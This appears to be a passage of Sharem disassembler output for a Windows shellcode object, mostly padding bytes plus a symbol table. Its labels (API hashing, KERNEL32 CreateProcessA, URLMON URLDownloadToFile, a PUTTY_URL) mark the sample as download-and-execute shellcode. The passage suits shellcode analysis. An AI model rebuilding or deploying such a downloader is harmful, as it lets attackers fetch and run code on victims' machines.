+0x3f5 db 0x00                                  00                     .
+0x3f6 db 0x00                                  00                     .
+0x3f7 db 0x00                                  00                     .
+0x3f8 db 0x00                                                         
+0x3f8 align 0x6                                00 00 00 00 ...        .......
+0x3fe db 0x02                                  02                     .
+0x3ff db 0x00                                  00                     .
+0x400 db 0x00                                  00                     .
+0x401 db 0x00                                  00                     .
+0x402 db 0x00                                  00                     .
+0x403 db 0x00                                                         
+0x403 align 0x1                                00 13 00 00 ...        .......
+0x404 db 0x13                                  13                     .
+0x405 db 0x00                                  00                     .
+0x406 db 0x00                                  00                     .
+0x407 db 0x00                                  00                     .
+0x408 db 0x00                                  00                     .
+0x409 db 0x00                                                         
+0x409 align 0x7                                00 00 00 00 ...        .......
+0x410 db 0x02                                  02                     .
+0x411 db 0x00                                  00                     .
+0x412 db 0x00                                  00                     .
+0x413 db 0x00                                  00                     .
+0x414 db 0x00                                  00                     .
+0x415 db 0x00                                                         
+0x415 align 0x1                                00 26 00 00 ...        .&.....
+0x416 db 0x26                                  26                     &
+0x417 db 0x00                                  00                     .
+0x418 db 0x00                                  00                     .
+0x419 db 0x00                                  00                     .
+0x41a db 0x00                                  00                     .
+0x41b db 0x00                                                         
+0x41b align 0x7                                00 00 00 00 ...        .......
+0x422 db 0x02                                  02                     .
+0x423 db 0x00                                  00                     .
+0x424 db 0x00                                  00                     .
+0x425 db 0x00                                  00                     .
+0x426 db 0x00                                  00                     .
+0x427 db 0x00                                                         
+0x427 align 0x1                                00 37 00 00 ...        .7.....
+0x428 db 0x37                                  37                     7
+0x429 db 0x00                                  00                     .
+0x42a db 0x00                                  00                     .
+0x42b db 0x00                                  00                     .
+0x42c db 0x00                                  00                     .
+0x42d db 0x00                                                         
+0x42d align 0x7                                00 00 00 00 ...        .......
+0x434 db 0x02                                  02                     .
+0x435 db 0x00                                  00                     .
+0x436 db 0x00                                  00                     .
+0x437 db 0x00                                  00                     .
+0x438 db 0x00                                  00                     .
+0x439 db 0x00                                                         
+0x439 align 0x1                                00 48 00 00 ...        .H.....
+0x43a db 0x48                                  48                     H
+0x43b db 0x00                                  00                     .
+0x43c db 0x00                                  00                     .
+0x43d db 0x00                                  00                     .
+0x43e db 0x00                                  00                     .
+0x43f db 0x00                                                         
+0x43f align 0x7                                00 00 00 00 ...        .......
+0x446 db 0x02                                  02                     .
+0x447 db 0x00                                  00                     .
+0x448 db 0x00                                  00                     .
+0x449 db 0x00                                  00                     .
+0x44a db 0x00                                  00                     .
+0x44b db 0x00                                                         
+0x44b align 0x1                                00 57 00 00 ...        .W.....
+0x44c db 0x57                                  57                     W
+0x44d db 0x00                                  00                     .
+0x44e db 0x00                                  00                     .
+0x44f db 0x00                                  00                     .
+0x450 db 0x00                                  00                     .
+0x451 db 0x00                                                         
+0x451 align 0x7                                00 00 00 00 ...        .......
+0x458 db 0x02                                  02                     .
+0x459 db 0x00                                  00                     .
+0x45a db 0x00                                  00                     .
+0x45b db 0x00                                  00                     .
+0x45c db 0x00                                  00                     .
+0x45d db 0x00                                                         
+0x45d align 0x1                                00 6c 00 00 ...        .l.....
+0x45e db 0x6c                                  6c                     l
+0x45f db 0x00                                  00                     .
+0x460 db 0x00                                  00                     .
+0x461 db 0x00                                  00                     .
+0x462 db 0x00                                  00                     .
+0x463 db 0x00                                                         
+0x463 align 0x7                                00 00 00 00 ...        .......
+0x46a db 0x02                                  02                     .
+0x46b db 0x00                                  00                     .
+0x46c db 0x00                                  00                     .
+0x46d db 0x00                                  00                     .
+0x46e db 0x00                                  00                     .
+0x46f db 0x00                                                         
+0x46f align 0x1                                00 7c 00 00 ...        .|.....
+0x470 db 0x7c                                  7c                     |
+0x471 db 0x00                                  00                     .
+0x472 db 0x00                                  00                     .
+0x473 db 0x00                                  00                     .
+0x474 db 0x00                                  00                     .
+0x475 db 0x00                                                         
+0x475 align 0x7                                00 00 00 00 ...        .......
+0x47c db 0x02                                  02                     .
+0x47d db 0x00                                  00                     .
+0x47e db 0x00                                  00                     .
+0x47f db 0x00                                  00                     .
+0x480 db 0x00                                  00                     .
+0x481 db 0x00                                                         
+0x481 align 0x1                                00 8a 00 00 ...        .......
+0x482 db 0x8a                                  8a                     .
+0x483 db 0x00                                  00                     .
+0x484 db 0x00                                  00                     .
+0x485 db 0x00                                  00                     .
+0x486 db 0x00                                  00                     .
+0x487 db 0x00                                                         
+0x487 align 0x7                                00 00 00 00 ...        .......
+0x48e db 0x02                                  02                     .
+0x48f db 0x00                                  00                     .
+0x490 db 0x00                                  00                     .
+0x491 db 0x00                                  00                     .
+0x492 db 0x00                                  00                     .
+0x493 db 0x00                                                         
+0x493 align 0x1                                00 98 00 00 ...        .......
+0x494 db 0x98                                  98                     .
+0x495 db 0x00                                  00                     .
+0x496 db 0x00                                  00                     .
+0x497 db 0x00                                  00                     .
+0x498 db 0x00                                  00                     .
+0x499 db 0x00                                                         
+0x499 align 0x7                                00 00 00 00 ...        .......
+0x4a0 db 0x02                                  02                     .
+0x4a1 db 0x00                                  00                     .
+0x4a2 db 0x00                                  00                     .
+0x4a3 db 0x00                                  00                     .
+0x4a4 db 0x00                                  00                     .
+0x4a5 db 0x00                                                         
+0x4a5 align 0x1                                00 a9 00 00 ...        .......
+0x4a6 db 0xa9                                  a9                     .
+0x4a7 db 0x00                                  00                     .
+0x4a8 db 0x00                                  00                     .
+0x4a9 db 0x00                                  00                     .
+0x4aa db 0x00                                  00                     .
+0x4ab db 0x00                                                         
+0x4ab align 0x7                                00 00 00 00 ...        .......
+0x4b2 db 0x02                                  02                     .
+0x4b3 db 0x00                                  00                     .
+0x4b4 db 0x00                                  00                     .
+0x4b5 db 0x00                                  00                     .
+0x4b6 db 0x00                                  00                     .
+0x4b7 db 0x00                                                         
+0x4b7 align 0x1                                00 b3 00 00 ...        .......
+0x4b8 db 0xb3                                  b3                     .
+0x4b9 db 0x00                                  00                     .
+0x4ba db 0x00                                  00                     .
+0x4bb db 0x00                                  00                     .
+0x4bc db 0x00                                  00                     .
+0x4bd db 0x00                                                         
+0x4bd align 0x7                                00 00 00 00 ...        .......
+0x4c4 db 0x02                                  02                     .
+0x4c5 db 0x00                                  00                     .
+0x4c6 db 0x00                                  00                     .
+0x4c7 db 0x00                                  00                     .
+0x4c8 db 0x00                                  00                     .
+0x4c9 db 0x00                                                         
+0x4c9 align 0x1                                00 c1 00 00 ...        .......
+0x4ca db 0xc1                                  c1                     .
+0x4cb db 0x00                                  00                     .
+0x4cc db 0x00                                  00                     .
+0x4cd db 0x00                                  00                     .
+0x4ce db 0x00                                  00                     .
+0x4cf db 0x00                                                         
+0x4cf align 0x7                                00 00 00 00 ...        .......
+0x4d6 db 0x02                                  02                     .
+0x4d7 db 0x00                                  00                     .
+0x4d8 URLMON ; string		             55 52 4c 4d 4f 4e      URLMON
+0x4de db 0x00                                  00                     .
+0x4df db 0x00                                  00                     .
+0x4e0 db 0x00                                  00                     .
+0x4e1 db 0x00                                  00                     .
+0x4e2 db 0x00                                                         
+0x4e2 align 0x6                                00 00 00 00 ...        .......
+0x4e8 add al, byte ptr [eax]                   02 00                  ..
+0x4ea push eax                                 50                     P
+0x4eb inc ecx                                  41                     A
+0x4ec push esp                                 54                     T
+0x4ed dec eax                                  48                     H
+0x4ee add byte ptr [eax], al                   00 00                  ..
+0x4f0 add byte ptr [eax], al                   00 00                  ..
+0x4f2 align 0x8                                00 00 00 00 ...        .......
+0x4fa db 0x02                                  02                     .
+0x4fb db 0x00                                  00                     .
+0x4fc db 0x00                                  00                     .
+0x4fd db 0x00                                  00                     .
+0x4fe db 0x00                                  00                     .
+0x4ff db 0x00                                                         
+0x4ff align 0x1                                00 cb 00 00 ...        .......
+0x500 db 0xcb                                  cb                     .
+0x501 db 0x00                                  00                     .
+0x502 db 0x00                                  00                     .
+0x503 db 0x00                                  00                     .
+0x504 db 0x00                                  00                     .
+0x505 db 0x00                                                         
+0x505 align 0x7                                00 00 00 00 ...        .......
+0x50c db 0x02                                  02                     .
+0x50d db 0x00                                  00                     .
+0x50e db 0x00                                  00                     .
+0x50f db 0x00                                  00                     .
+0x510 db 0x00                                  00                     .
+0x511 db 0x00                                                         
+0x511 align 0x1                                00 d5 00 00 ...        .......
+0x512 db 0xd5                                  d5                     .
+0x513 db 0x00                                  00                     .
+0x514 db 0x00                                  00                     .
+0x515 db 0x00                                  00                     .
+0x516 db 0x00                                  00                     .
+0x517 db 0x00                                                         
+0x517 align 0x7                                00 00 00 00 ...        .......
+0x51e db 0x02                                  02                     .
+0x51f db 0x00                                  00                     .
+0x520 db 0x00                                  00                     .
+0x521 db 0x00                                  00                     .
+0x522 db 0x00                                  00                     .
+0x523 db 0x00                                                         
+0x523 align 0x1                                00 e7 00 00 ...        .......
+0x524 db 0xe7                                  e7                     .
+0x525 db 0x00                                  00                     .
+0x526 db 0x00                                  00                     .
+0x527 db 0x00                                  00                     .
+0x528 db 0x00                                  00                     .
+0x529 db 0x00                                                         
+0x529 align 0x7                                00 00 00 00 ...        .......
+0x530 db 0x02                                  02                     .
+0x531 db 0x00                                  00                     .
+0x532 db 0x00                                  00                     .
+0x533 db 0x00                                  00                     .
+0x534 db 0x00                                  00                     .
+0x535 db 0x00                                                         
+0x535 align 0x1                                00 fe 00 00 ...        .......
+0x536 db 0xfe                                  fe                     .
+0x537 db 0x00                                  00                     .
+0x538 db 0x00                                  00                     .
+0x539 db 0x00                                  00                     .
+0x53a db 0x00                                  00                     .
+0x53b db 0x00                                                         
+0x53b align 0x7                                00 00 00 00 ...        .......
+0x542 db 0x02                                  02                     .
+0x543 db 0x00                                  00                     .
+0x544 db 0x00                                  00                     .
+0x545 db 0x00                                  00                     .
+0x546 db 0x00                                  00                     .
+0x547 db 0x00                                                         
+0x547 align 0x1                                00 16 01 00 ...        .......
+0x548 push ss                                  16                     .
+0x549 add dword ptr [eax], eax                 01 00                  ..
+0x54b add byte ptr [eax], al                   00 00                  ..
+0x54d db 0x00                                  00                     .
+0x54e align 0x6                                00 00 00 00 ...        .......
+0x554 db 0x02                                  02                     .
+0x555 db 0x00                                  00                     .
+0x556 db 0x00                                  00                     .
+0x557 db 0x00                                  00                     .
+0x558 db 0x00                                  00                     .
+0x559 db 0x00                                                         
+0x559 align 0x1                                00 2b 01 00 ...        .+.....
+0x55a sub eax, dword ptr [ecx]                 2b 01                  +.
+0x55c add byte ptr [eax], al                   00 00                  ..
+0x55e add byte ptr [eax], al                   00 00                  ..
+0x560 align 0x6                                00 00 00 00 ...        .......
+0x566 db 0x02                                  02                     .
+0x567 db 0x00                                  00                     .
+0x568 db 0x00                                  00                     .
+0x569 db 0x00                                  00                     .
+0x56a db 0x00                                  00                     .
+0x56b db 0x00                                                         
+0x56b align 0x1                                00 3b 01 00 ...        .;.....
+0x56c cmp eax, dword ptr [ecx]                 3b 01                  ;.
+0x56e add byte ptr [eax], al                   00 00                  ..
+0x570 add byte ptr [eax], al                   00 00                  ..
+0x572 align 0x6                                00 00 00 00 ...        .......
+0x578 db 0x02                                  02                     .
+0x579 db 0x00                                  00                     .
+0x57a db 0x00                                  00                     .
+0x57b db 0x00                                  00                     .
+0x57c db 0x00                                  00                     .
+0x57d db 0x00                                                         
+0x57d align 0x1                                00 50 01 00 ...        .P.....
+0x57e push eax                                 50                     P
+0x57f add dword ptr [eax], eax                 01 00                  ..
+0x581 add byte ptr [eax], al                   00 00                  ..
+0x583 db 0x00                                  00                     .
+0x584 align 0x6                                00 00 00 00 ...        .......
+0x58a db 0x02                                  02                     .
+0x58b db 0x00                                  00                     .
+0x58c db 0x00                                  00                     .
+0x58d db 0x00                                  00                     .
+0x58e db 0x00                                  00                     .
+0x58f db 0x00                                                         
+0x58f align 0x1                                00 69 01 00 ...        .i.....
+0x590 imul eax, dword ptr [ecx], 0             69 01 00 00 00 00      i.....
+0x596 align 0x6                                00 00 00 00 ...        .......
+0x59c db 0x02                                  02                     .
+0x59d db 0x00                                  00                     .
+0x59e db 0x00                                  00                     .
+0x59f db 0x00                                  00                     .
+0x5a0 db 0x00                                  00                     .
+0x5a1 db 0x00                                                         
+0x5a1 align 0x1                                00 7d 01 00 ...        .}.....
+0x5a2 db 0x7d                                  7d                     }
+0x5a3 db 0x01                                  01                     .
+0x5a4 db 0x00                                  00                     .
+	 label_0x5a5:
+0x5a5 db 0x00                                  00                     .
+0x5a6 db 0x00                                  00                     .
+0x5a7 db 0x00                                  00                     .
+0x5a8 db 0x00                                                         
+0x5a8 align 0x6                                00 00 00 00 ...        .......
+0x5ae db 0x02                                  02                     .
+0x5af db 0x00                                  00                     .
+0x5b0 db 0x00                                  00                     .
+0x5b1 db 0x00                                  00                     .
+0x5b2 db 0x00                                  00                     .
+0x5b3 db 0x00                                                         
+0x5b3 align 0x1                                00 89 01 00 ...        .......
+0x5b4 mov dword ptr [ecx], eax                 89 01                  ..
+0x5b6 add byte ptr [eax], al                   00 00                  ..
+0x5b8 add byte ptr [eax], al                   00 00                  ..
+0x5ba align 0x6                                00 00 00 00 ...        .......
+0x5c0 db 0x02                                  02                     .
+0x5c1 db 0x00                                  00                     .
+0x5c2 db 0x40                                  40 66 65 61 74 2e 30 30  @feat.00
+0x5ca add dword ptr [eax], eax                 01 00                  ..
+0x5cc add byte ptr [eax], al                   00 00                  ..
+0x5ce db 0xff                                  ff                     .
+0x5cf inc dword ptr [eax]                      ff 00                  ..
+0x5d1 add byte ptr [ebx], al                   00 03                  ..
+0x5d3 db 0x00                                  00                     .
+0x5d4 xchg eax, ebp                            95                     .
+0x5d5 add dword ptr [eax], eax                 01 00                  ..
+0x5d7 db 0x00                                  00                     .
+0x5d8 mainentrypoint ; string		     6d 61 69 6e 65 6e 74 72 ... mainentrypoint
+0x5e6 db 0x00                                  00                     .
+0x5e7 get_module_address ; string		  67 65 74 5f 6d 6f 64 75 ... get_module_address
+0x5f9 db 0x00                                  00                     .
+0x5fa next_module_loop ; string		   6e 65 78 74 5f 6d 6f 64 ... next_module_loop
+0x60a db 0x00                                  00                     .
+0x60b module_hash_loop ; string		   6d 6f 64 75 6c 65 5f 68 ... module_hash_loop
+0x61b db 0x00                                  00                     .
+0x61c end_hash_check ; string		     65 6e 64 5f 68 61 73 68 ... end_hash_check
+0x62a db 0x00                                  00                     .
+0x62b end_module_hash_loop ; string		  65 6e 64 5f 6d 6f 64 75 ... end_module_hash_loop
+0x63f db 0x00                                  00                     .
+0x640 get_api_address ; string		    67 65 74 5f 61 70 69 5f ... get_api_address
+0x64f db 0x00                                  00                     .
+0x650 load_api_hash ; string		      6c 6f 61 64 5f 61 70 69 ... load_api_hash
+0x65d db 0x00                                  00                     .
+0x65e load_api_name ; string		      6c 6f 61 64 5f 61 70 69 ... load_api_name
+0x66b db 0x00                                  00                     .
+0x66c create_hash_loop ; string		   63 72 65 61 74 65 5f 68 ... create_hash_loop
+0x67c db 0x00                                  00                     .
+0x67d callpop_1 ; string		          63 61 6c 6c 70 6f 70 5f ... callpop_1
+0x686 db 0x00                                  00                     .
+0x687 load_api_addy ; string		      6c 6f 61 64 5f 61 70 69 ... load_api_addy
+0x694 db 0x00                                  00                     .
+0x695 callpop_2 ; string		          63 61 6c 6c 70 6f 70 5f ... callpop_2
+0x69e db 0x00                                  00                     .
+0x69f PUTTY_URL ; string		          50 55 54 54 59 5f 55 52 ... PUTTY_URL
+0x6a8 db 0x00                                  00                     .
+0x6a9 KERNEL32HASHTABLE ; string		  4b 45 52 4e 45 4c 33 32 ... KERNEL32HASHTABLE
+0x6ba db 0x00                                  00                     .
+0x6bb KERNEL32FUNCTIONSTABLE ; string		  4b 45 52 4e 45 4c 33 32 ... KERNEL32FUNCTIONSTABLE
+0x6d1 db 0x00                                  00                     .
+0x6d2 KERNEL32_CREATEPROCESSA ; string		  4b 45 52 4e 45 4c 33 32 ... KERNEL32_CREATEPROCESSA
+0x6e9 db 0x00                                  00                     .
+0x6ea KERNEL32_LOADLIBRARY ; string		  4b 45 52 4e 45 4c 33 32 ... KERNEL32_LOADLIBRARY
+0x6fe db 0x00                                  00                     .
+0x6ff URLMONHASHTABLE ; string		    55 52 4c 4d 4f 4e 48 41 ... URLMONHASHTABLE
+0x70e db 0x00                                  00                     .
+0x70f URLMONFUNCTIONSTABLE ; string		  55 52 4c 4d 4f 4e 46 55 ... URLMONFUNCTIONSTABLE
+0x723 db 0x00                                  00                     .
+0x724 URLMON_URLDOWNLOADTOFILE ; string		  55 52 4c 4d 4f 4e 5f 55 ... URLMON_URLDOWNLOADTOFILE
+0x73c db 0x00                                  00                     .
+0x73d PROCESS_INFORMATION ; string		  50 52 4f 43 45 53 53 5f ... PROCESS_INFORMATION
+0x750 db 0x00                                  00                     .
+0x751 STARTUPINFO ; string		        53 54 41 52 54 55 50 49 ... STARTUPINFO
+0x75c db 0x00                                  00                     .
+0x75d ExitProcess ; string		        45 78 69 74 50 72 6f 63 ... ExitProcess
+0x768 db 0x00                                  00                     .
+
+	Disassembly printed to disassembly\heavenbin-disassembly.txt
+ Sharem> 
